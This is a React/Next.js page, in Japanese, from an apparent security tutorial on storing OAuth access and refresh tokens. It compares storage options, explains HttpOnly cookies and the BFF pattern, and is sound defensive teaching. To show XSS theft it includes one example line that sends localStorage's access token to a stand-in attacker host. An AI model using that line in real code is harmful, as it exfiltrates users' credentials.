import Link from "next/link";
import { ContentLayout } from "@/components/layout/content-layout";
import {
  Card,
  CardHeader,
  CardTitle,
  CardContent,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";

const storageComparison = [
  {
    method: "localStorage",
    risk: "high",
    xssVulnerable: true,
    csrfVulnerable: false,
    persistence: "永続（手動削除まで）",
    description: "XSS攻撃で簡単にトークンを盗まれる。最も危険な保存場所。",
  },
  {
    method: "sessionStorage",
    risk: "high",
    xssVulnerable: true,
    csrfVulnerable: false,
    persistence: "タブを閉じるまで",
    description:
      "localStorageよりはマシだが、XSSに対しては同様に脆弱。タブごとに独立。",
  },
  {
    method: "Cookie（通常）",
    risk: "high",
    xssVulnerable: true,
    csrfVulnerable: true,
    persistence: "有効期限まで",
    description: "XSSとCSRFの両方に脆弱。JavaScript からアクセス可能。",
  },
  {
    method: "HttpOnly Cookie",
    risk: "low",
    xssVulnerable: false,
    csrfVulnerable: true,
    persistence: "有効期限まで",
    description:
      "JavaScriptからアクセス不可。SameSite属性でCSRFも防止可能。推奨。",
  },
  {
    method: "メモリ（変数）",
    risk: "low",
    xssVulnerable: false,
    csrfVulnerable: false,
    persistence: "ページリロードで消失",
    description:
      "最も安全だが、リロードでトークンが消える。サイレントリフレッシュとの併用が必要。",
  },
] as const;

export default function TokenStoragePage() {
  return (
    <ContentLayout
      title="トークンの安全な保存方法"
      description="アクセストークンやリフレッシュトークンをどこに保存すべきか。各保存方法のリスクと推奨パターンを比較します。"
      badge="セキュリティ"
    >
      {/* 保存方法の比較 */}
      <Card className="bg-zinc-900 border-zinc-800">
        <CardHeader>
          <CardTitle className="text-xl text-zinc-100">
            保存方法の比較
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            {storageComparison.map((item) => (
              <div
                key={item.method}
                className={`rounded-lg border p-4 ${
                  item.risk === "high"
                    ? "bg-red-950/20 border-red-800/30"
                    : "bg-emerald-950/20 border-emerald-800/30"
                }`}
              >
                <div className="flex items-center gap-3 mb-2">
                  <h3 className="font-semibold text-zinc-100">
                    {item.method}
                  </h3>
                  <Badge
                    variant={
                      item.risk === "high" ? "destructive" : "secondary"
                    }
                  >
                    {item.risk === "high" ? "危険" : "推奨"}
                  </Badge>
                </div>
                <p className="text-sm text-zinc-300 mb-3">
                  {item.description}
                </p>
                <div className="flex flex-wrap gap-4 text-xs">
                  <span
                    className={
                      item.xssVulnerable
                        ? "text-red-400"
                        : "text-emerald-400"
                    }
                  >
                    XSS: {item.xssVulnerable ? "脆弱" : "安全"}
                  </span>
                  <span
                    className={
                      item.csrfVulnerable
                        ? "text-red-400"
                        : "text-emerald-400"
                    }
                  >
                    CSRF: {item.csrfVulnerable ? "脆弱" : "安全"}
                  </span>
                  <span className="text-zinc-500">
                    持続性: {item.persistence}
                  </span>
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* 各保存方法のリスク詳細 */}
      <Card className="bg-red-950/30 border-red-800/50">
        <CardHeader>
          <CardTitle className="text-xl text-red-400">
            localStorageが危険な理由
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4 text-zinc-300 leading-relaxed">
          <p>
            localStorageに保存されたトークンは、同一オリジン上のすべてのJavaScriptからアクセスできます。
            XSS（クロスサイトスクリプティング）攻撃が成功した場合、
            攻撃者のスクリプトが簡単にトークンを盗み出せます。
          </p>
          <div className="rounded-lg bg-zinc-950 border border-zinc-800 p-4 font-mono text-sm overflow-x-auto">
            <pre className="whitespace-pre text-zinc-300">{`// XSS攻撃者が実行するスクリプト（たった1行で盗める）
fetch("https://evil.example.com/steal?token=" + localStorage.getItem("access_token"));`}</pre>
          </div>
          <p className="text-sm text-zinc-400">
            サードパーティのnpmパッケージ、広告スクリプト、ブラウザ拡張機能など、
            予期しないJavaScriptが実行される経路は多数存在します。
            localStorageにトークンを保存することは、これらすべてを信頼することを意味します。
          </p>
        </CardContent>
      </Card>

      {/* HttpOnly Cookieのメリット */}
      <Card className="bg-emerald-950/30 border-emerald-800/50">
        <CardHeader>
          <CardTitle className="text-xl text-emerald-400">
            HttpOnly Cookieのメリット
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4 text-zinc-300 leading-relaxed">
          <p>
            HttpOnly 属性が付与されたCookieは、JavaScriptから一切アクセスできません。
            ブラウザが自動的にリクエストに付与するため、XSS攻撃でトークンを盗むことが
            不可能になります。
          </p>
          <div className="rounded-lg bg-zinc-950 border border-zinc-800 p-4 font-mono text-sm overflow-x-auto">
            <pre className="whitespace-pre text-zinc-300">{`Set-Cookie: session=abc123;
  HttpOnly;        // JavaScriptからアクセス不可
  Secure;          // HTTPSでのみ送信
  SameSite=Lax;    // クロスサイトリクエストで送信されない
  Path=/;          // すべてのパスで有効
  Max-Age=3600     // 1時間で失効`}</pre>
          </div>
          <div className="rounded-lg bg-blue-950/30 border border-blue-800/30 p-4">
            <p className="text-blue-400 text-sm">
              SameSite=Lax または SameSite=Strict を設定することで、
              CSRF攻撃も防止できます。モダンブラウザではデフォルトで SameSite=Lax が適用されます。
            </p>
          </div>
        </CardContent>
      </Card>

      {/* BFFパターン */}
      <Card className="bg-zinc-900 border-zinc-800">
        <CardHeader>
          <CardTitle className="text-xl text-zinc-100">
            BFF (Backend for Frontend) パターン
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4 text-zinc-300 leading-relaxed">
          <p>
            BFFパターンは、SPAのセキュリティ問題を根本的に解決するアーキテクチャです。
            トークンをブラウザに一切渡さず、サーバーサイドで管理します。
          </p>
          <div className="rounded-lg bg-zinc-950 border border-zinc-800 p-4 font-mono text-xs sm:text-sm overflow-x-auto">
            <pre className="whitespace-pre text-zinc-300">{`ブラウザ (SPA)              BFFサーバー            認可サーバー
    |                          |                      |
    |--- セッションCookie ----->|                      |
    |   (トークンなし)          |                      |
    |                          |--- アクセストークン -->|
    |                          |   (サーバー側で保持)   |
    |                          |                      |
    |<-- APIレスポンス ---------|<-- リソース ----------|
    |   (データのみ)            |                      |`}</pre>
          </div>
          <ul className="space-y-2 text-sm">
            <li className="flex gap-2">
              <span className="text-emerald-400">1.</span>
              ブラウザとBFFサーバー間はHttpOnly Cookieのセッションで認証
            </li>
            <li className="flex gap-2">
              <span className="text-emerald-400">2.</span>
              トークンはBFFサーバーのメモリまたはセッションストアに保存
            </li>
            <li className="flex gap-2">
              <span className="text-emerald-400">3.</span>
              APIリクエストはBFFサーバーがプロキシし、トークンを付与
            </li>
            <li className="flex gap-2">
              <span className="text-emerald-400">4.</span>
              ブラウザ上にトークンが存在しないため、XSSでもトークン漏洩が起きない
            </li>
          </ul>
        </CardContent>
      </Card>

      {/* 推奨パターンまとめ */}
      <Card className="bg-emerald-950/30 border-emerald-800/50">
        <CardHeader>
          <CardTitle className="text-xl text-emerald-400">
            推奨パターン
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4 text-zinc-300">
          <div className="overflow-x-auto">
            <table className="w-full text-sm text-zinc-300">
              <thead>
                <tr className="border-b border-zinc-700">
                  <th className="text-left py-3 px-4 text-zinc-400 font-medium">
                    アプリケーション
                  </th>
                  <th className="text-left py-3 px-4 text-zinc-400 font-medium">
                    推奨保存方法
                  </th>
                </tr>
              </thead>
              <tbody>
                <tr className="border-b border-zinc-800">
                  <td className="py-3 px-4 text-zinc-100">
                    SPA（バックエンドあり）
                  </td>
                  <td className="py-3 px-4">
                    BFFパターン（HttpOnly Cookie + サーバー側トークン管理）
                  </td>
                </tr>
                <tr className="border-b border-zinc-800">
                  <td className="py-3 px-4 text-zinc-100">
                    SPA（バックエンドなし）
                  </td>
                  <td className="py-3 px-4">
                    メモリ保存 + サイレントリフレッシュ、またはService Worker内で管理
                  </td>
                </tr>
                <tr className="border-b border-zinc-800">
                  <td className="py-3 px-4 text-zinc-100">
                    サーバーサイドアプリ
                  </td>
                  <td className="py-3 px-4">
                    サーバーセッション内（メモリまたはデータストア）
                  </td>
                </tr>
                <tr>
                  <td className="py-3 px-4 text-zinc-100">
                    モバイルアプリ
                  </td>
                  <td className="py-3 px-4">
                    OS提供のセキュアストレージ（Keychain / Keystore）
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </CardContent>
      </Card>

      {/* 次のステップ */}
      <Card className="bg-blue-950/30 border-blue-800/50">
        <CardContent className="pt-6">
          <p className="text-blue-400 font-medium mb-2">次のステップ</p>
          <p className="text-zinc-300">
            次は{" "}
            <Link
              href="/security/common-attacks"
              className="text-blue-400 underline underline-offset-4 hover:text-blue-300"
            >
              よくある攻撃と対策
            </Link>{" "}
            で、OAuth/OIDCに対する代表的な攻撃パターンと防御方法を学びましょう。
          </p>
        </CardContent>
      </Card>
    </ContentLayout>
  );
}
